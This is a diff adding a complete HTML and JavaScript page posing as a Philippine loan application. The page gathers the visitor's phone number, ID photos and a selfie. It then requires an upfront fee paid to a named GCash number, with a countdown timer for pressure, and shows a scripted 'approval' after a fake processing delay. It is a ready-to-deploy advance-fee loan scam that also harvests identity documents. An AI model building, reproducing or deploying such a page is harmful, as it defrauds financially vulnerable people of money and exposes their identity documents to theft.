@@ -1,0 +1,379 @@
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Philippines Loan Application</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            background: #f5f7fa;
+            color: #222;
+            max-width: 600px;
+            padding: 20px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        header {
+            background: #2c98f0;
+            color: white;
+            padding: 24px 12px;
+            border-radius: 8px 8px 0 0;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-weight: 700;
+            font-size: 1.9rem;
+            letter-spacing: 1.2px;
+        }
+        main {
+            background: white;
+            padding: 24px;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+        }
+        form label {
+            display: block;
+            margin-top: 18px;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+        form input[type="number"],
+        form select,
+        form input[type="file"],
+        form input[type="text"] {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 1rem;
+            margin-top: 6px;
+            border-radius: 6px;
+            border: 1.8px solid #ddd;
+            transition: border-color 0.3s ease;
+        }
+        form input[type="number"]:focus,
+        form select:focus,
+        form input[type="file"]:focus,
+        form input[type="text"]:focus {
+            outline: none;
+            border-color: #2c98f0;
+        }
+        button {
+            margin-top: 28px;
+            width: 100%;
+            background-color: #2c98f0;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #1a6fd0;
+        }
+        .info-panel {
+            margin-top: 24px;
+            background: #e8f0fe;
+            padding: 18px 20px;
+            border-left: 6px solid #2c98f0;
+            border-radius: 6px;
+        }
+        .info-panel h2 {
+            margin-top: 0;
+            margin-bottom: 12px;
+            font-weight: 700;
+            color: #1c2237;
+        }
+        .countdown {
+            font-weight: 700;
+            color: #d93025;
+            font-size: 1.2rem;
+            margin-top: 18px;
+            text-align: center;
+        }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9rem;
+            color: #555;
+        }
+        .hidden { display: none; }
+        .center {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Philippines Loan Application</h1>
+    </header>
+    <main>
+        <section id="loanFormSection">
+            <form id="loanForm" autocomplete="off" novalidate>
+                <label for="phoneNumber">Mobile Number (for loan processing notification):</label>
+                <input
+                    type="text"
+                    id="phoneNumber"
+                    name="phoneNumber"
+                    placeholder="e.g. 09XXXXXXXXX"
+                    pattern="09\d{9}"
+                    title="Must start with 09 and followed by 9 digits"
+                    required
+                />
+                <label for="loanAmount">Loan Amount (₱1,000 - ₱20,000):</label>
+                <input
+                    type="number"
+                    id="loanAmount"
+                    name="loanAmount"
+                    min="1000"
+                    max="20000"
+                    required
+                    placeholder="Enter desired loan amount"
+                />
+                <label for="idType">Select Valid ID Type:</label>
+                <select id="idType" name="idType" required>
+                    <option value="" disabled selected>-- Select your ID --</option>
+                    <option value="passport">Philippine Passport</option>
+                    <option value="drivers_license">Driver's License</option>
+                    <option value="postal_id">Postal ID</option>
+                    <option value="sss_id">SSS ID</option>
+                    <option value="tin_id">TIN ID</option>
+                    <option value="philhealth_id">PhilHealth ID</option>
+                    <option value="voter_id">Voter's ID</option>
+                    <option value="prc_id">PRC ID</option>
+                    <option value="school_id">Student ID / School ID</option>
+                </select>
+                <label for="idFront">Upload ID Front (Camera enabled):</label>
+                <input
+                    type="file"
+                    id="idFront"
+                    accept="image/*"
+                    capture="environment"
+                    required
+                    aria-describedby="idFrontNote"
+                />
+                <div class="upload-note" id="idFrontNote">You can take a new photo or upload from your device.</div>
+                <label for="idBack">Upload ID Back (Camera enabled):</label>
+                <input
+                    type="file"
+                    id="idBack"
+                    accept="image/*"
+                    capture="environment"
+                    required
+                    aria-describedby="idBackNote"
+                />
+                <div class="upload-note" id="idBackNote">You can take a new photo or upload from your device.</div>
+                <label for="selfie">Upload Selfie (Camera enabled):</label>
+                <input
+                    type="file"
+                    id="selfie"
+                    accept="image/*"
+                    capture="user"
+                    required
+                    aria-describedby="selfieNote"
+                />
+                <div class="upload-note" id="selfieNote">Take a selfie or upload a photo.</div>
+                <button type="submit">Submit Loan Application</button>
+            </form>
+            <div class="info-panel" aria-label="Loan Information">
+                <h2>Important Loan Information</h2>
+                <ul>
+                    <li>Loan amount limit: ₱1,000 to ₱20,000</li>
+                    <li>Accepted valid IDs: Passport, Driver's License, Postal ID, SSS, TIN, PhilHealth, Voter's ID, PRC, Student/School ID</li>
+                    <li>Loan payout via E-wallets: GCash and PayMaya only</li>
+                    <li>Send payment / fees to GCash number: <strong>09947665327</strong></li>
+                    <li>Loan application will NOT proceed unless fees are paid</li>
+                    <li>You will proceed to payment page after submitting application</li>
+                </ul>
+            </div>
+        </section>
+        <section id="paymentSection" class="hidden">
+            <h2 class="center">Loan Payment Details</h2>
+            <p>Please select where you want your loan sent and upload proof of payment to proceed.</p>
+            <form id="paymentForm" autocomplete="off" novalidate>
+                <p><strong>Loan Amount: ₱<span id="loanAmountDisplay"></span></strong></p>
+                <label for="paymentMethod">Select Payment Method:</label>
+                <select id="paymentMethod" name="paymentMethod" required>
+                    <option value="" disabled selected>-- Select method --</option>
+                    <option value="gcash">GCash</option>
+                    <option value="paymaya">PayMaya</option>
+                </select>
+                <div style="margin-top:12px;">
+                    <p><strong>Payment To:</strong> 09947665327 (GCash)</p>
+                    <p><em>(Payments must be made before continuing.)</em></p>
+                </div>
+                <label for="transactionRef">Transaction Reference Number:</label>
+                <input
+                    type="text"
+                    id="transactionRef"
+                    name="transactionRef"
+                    placeholder="Enter your transaction reference number"
+                    required
+                />
+                <label for="transactionProofUpload">Upload Proof of Payment:</label>
+                <input
+                    type="file"
+                    id="transactionProofUpload"
+                    accept="image/*"
+                    capture="environment"
+                    required
+                />
+                <div class="countdown" id="countdownTimer">Time left to submit payment proof: 10:00</div>
+                <button type="submit">Submit Payment Proof</button>
+            </form>
+            <div id="processingMessage" class="hidden">
+                <p class="center" style="font-weight:bold; color:#2c98f0; margin-top:20px;">
+                    Please wait, your loan is being processed. This may take a few minutes.
+                </p>
+                <p class="center">You will receive a text message once your loan is approved.</p>
+                <div class="countdown" id="processCountdown">Processing time left: 05:00</div>
+            </div>
+        </section>
+        <section id="approvalSection" class="hidden">
+            <h2 class="center">Loan Application Status</h2>
+            <p class="center" id="approvalMessage"></p>
+        </section>
+    </main>
+    <footer>
+        © 2024 Philippines Loan Application. All rights reserved.
+    </footer>
+    <script>
+        (function() {
+            const loanForm = document.getElementById('loanForm');
+            const paymentForm = document.getElementById('paymentForm');
+            const loanFormSection = document.getElementById('loanFormSection');
+            const paymentSection = document.getElementById('paymentSection');
+            const approvalSection = document.getElementById('approvalSection');
+            const loanAmountDisplay = document.getElementById('loanAmountDisplay');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const processCountdown = document.getElementById('processCountdown');
+            const processingMessage = document.getElementById('processingMessage');
+            const approvalMessage = document.getElementById('approvalMessage');
+            let countdown = 600; // 10 minutes in seconds for payment proof submission
+            let countdownInterval;
+            let processTime = 300; // 5 minutes processing time
+            let processInterval;
+            let loanData = {
+                phoneNumber: '',
+                loanAmount: 0,
+                paymentMethod: ''
+            };
+            function startCountdown() {
+                countdownTimer.textContent = "Time left to submit payment proof: 10:00";
+                countdown = 600;
+                if (countdownInterval) clearInterval(countdownInterval);
+                countdownInterval = setInterval(() => {
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        alert("Loan application canceled due to non-submission of payment proof within 10 minutes.");
+                        resetApp();
+                        return;
+                    }
+                    const mins = Math.floor(countdown / 60).toString().padStart(2, '0');
+                    const secs = (countdown % 60).toString().padStart(2, '0');
+                    countdownTimer.textContent = `Time left to submit payment proof: ${mins}:${secs}`;
+                    countdown--;
+                }, 1000);
+            }
+            function startProcessing() {
+                paymentForm.classList.add('hidden');
+                processingMessage.classList.remove('hidden');
+                processCountdown.textContent = `Processing time left: 05:00`;
+                processTime = 300;
+                processInterval = setInterval(() => {
+                    if(processTime <= 0){
+                        clearInterval(processInterval);
+                        processingMessage.classList.add('hidden');
+                        approvalSection.classList.remove('hidden');
+                        approvalMessage.textContent = `Na Approve na Ang Iyong loan amount na PHP ${loanData.loanAmount.toLocaleString()}. Check muna ang Iyong GCash/PayMaya.`;
+                        alert(`Na Approve na Ang Iyong loan amount na PHP ${loanData.loanAmount.toLocaleString()}. Check muna ang Iyong GCash/PayMaya.`);
+                        return;
+                    }
+                    const mins = Math.floor(processTime / 60).toString().padStart(2,'0');
+                    const secs = (processTime % 60).toString().padStart(2,'0');
+                    processCountdown.textContent = `Processing time left: ${mins}:${secs}`;
+                    processTime--;
+                }, 1000);
+            }
+            function resetApp(){
+                loanFormSection.classList.remove('hidden');
+                paymentSection.classList.add('hidden');
+                approvalSection.classList.add('hidden');
+                loanForm.reset();
+                paymentForm.reset();
+            }
+            loanForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const phoneInput = loanForm.phoneNumber.value.trim();
+                const phoneValid = /^09\d{9}$/.test(phoneInput);
+                if (!phoneValid) {
+                    alert('Please enter a valid Philippine mobile number starting with 09 and 11 digits total');
+                    return;
+                }
+                const loanAmount = Number(loanForm.loanAmount.value);
+                if (!(loanAmount >= 1000 && loanAmount <= 20000)) {
+                    alert('Loan amount must be between ₱1,000 and ₱20,000');
+                    return;
+                }
+                if (!loanForm.idType.value) {
+                    alert('Please select your valid ID type');
+                    return;
+                }
+                if(!loanForm.idFront.files[0]){
+                    alert('Please upload your ID front image');
+                    return;
+                }
+                if(!loanForm.idBack.files[0]){
+                    alert('Please upload your ID back image');
+                    return;
+                }
+                if(!loanForm.selfie.files[0]){
+                    alert('Please upload your selfie image');
+                    return;
+                }
+                loanData.phoneNumber = phoneInput;
+                loanData.loanAmount = loanAmount;
+                // Show payment section
+                loanFormSection.classList.add('hidden');
+                paymentSection.classList.remove('hidden');
+                loanAmountDisplay.textContent = loanAmount.toLocaleString();
+                startCountdown();
+            });
+            paymentForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                if (!paymentForm.paymentMethod.value) {
+                    alert('Please select a payment method (GCash or PayMaya)');
+                    return;
+                }
+                if (!paymentForm.transactionRef.value.trim()) {
+                    alert('Please enter your transaction reference number');
+                    return;
+                }
+                if(!paymentForm.transactionProofUpload.files[0]){
+                    alert('Please upload your payment proof image');
+                    return;
+                }
+                let ref = paymentForm.transactionRef.value.trim();
+                // Very basic scam check: Ref must be alphanumeric and >= 5 characters
+                if (!/^[a-zA-Z0-9\-]{5,}$/.test(ref)) {
+                    alert('Invalid transaction reference number. Please enter a valid reference.');
+                    return;
+                }
+                loanData.paymentMethod = paymentForm.paymentMethod.value;
+                clearInterval(countdownInterval);
+                startProcessing();
+            });
+            resetApp();
+        })();
+    </script>
+</body>
+</html>
+
+```
+
